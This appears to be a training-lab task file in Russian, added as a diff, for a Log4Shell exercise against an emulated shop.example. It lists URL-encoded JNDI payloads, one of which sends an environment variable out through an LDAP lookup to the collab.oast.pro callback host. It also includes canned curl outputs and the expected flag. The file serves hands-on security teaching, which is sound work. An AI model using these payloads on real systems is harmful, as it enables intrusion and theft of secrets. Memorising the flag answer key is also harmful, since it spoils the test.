@@ -1,0 +1,47 @@
+{
+  "id": "web-log4shell-jndi",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{l0g4sh3ll_3xf1l_v14_3nv_l00kup}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Log4Shell на shop.example\n\nПриложение логирует query-параметр `q` через Log4j 2. Оно в debug-режиме,\nпоэтому в ответе видно, как раскрылась строка лога.\n\n1. Обычный запрос: `curl -s 'http://shop.example/?q=hello'`.\n2. Безопасное подтверждение (DNS, без загрузки кода):\n   `curl -s 'http://shop.example/?q=%24%7Bjndi:dns://ua.collab.oast.pro/%7D'`\n   В debug-блоке видно, что lookup выполнен (но без результата).\n3. Эксфильтрация переменной окружения вложенным lookup'ом:\n   `curl -s 'http://shop.example/?q=%24%7Bjndi:ldap://collab.oast.pro/%24%7Benv:FLAG%7D%7D'`\n   (%24 — это `$`, %7B — `{`: в query-параметре payload нужно URL-кодировать.)\n4. В debug-строке появится раскрытый флаг:\n   `... | grep 'nto' > found.txt`, затем `check`.\n\nДля реальной цели callback уходит на твой collab-листенер; здесь он показан inline.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.example, debug-режим)",
+      "cases": [
+        {
+          "match": "env:flag",
+          "example": "-s 'http://shop.example/?q=%24%7Bjndi:ldap://collab.oast.pro/%24%7Benv:FLAG%7D%7D'",
+          "output": "<html><body><h1>VantaDrop</h1><pre>[2026-10-13 10:14:02] INFO  http - q=${jndi:ldap://collab.oast.pro/nto{l0g4sh3ll_3xf1l_v14_3nv_l00kup}} (expanded: JNDI lookup executed)</pre></body></html>\n"
+        },
+        {
+          "match": "jndi:dns",
+          "example": "-s 'http://shop.example/?q=%24%7Bjndi:dns://ua.collab.oast.pro/%7D'",
+          "output": "<html><body><h1>VantaDrop</h1><pre>[2026-10-13 10:14:02] INFO  http - q=${jndi:dns://ua.collab.oast.pro/} (lookup executed, no expansion result)</pre></body></html>\n"
+        },
+        {
+          "match": "jndi",
+          "example": "-s 'http://shop.example/?q=%24%7Bjndi:ldap://collab.oast.pro/a%7D'",
+          "output": "<html><body><h1>VantaDrop</h1><pre>[2026-10-13 10:14:02] INFO  http - q=${jndi:dns://ua.collab.oast.pro/} (lookup executed, no expansion result)</pre></body></html>\n"
+        },
+        {
+          "match": "\\?q=",
+          "example": "-s 'http://shop.example/?q=hello'",
+          "output": "<html><body><h1>VantaDrop</h1><p>internal service</p></body></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.example/ (параметр q).\n"
+    }
+  }
+}
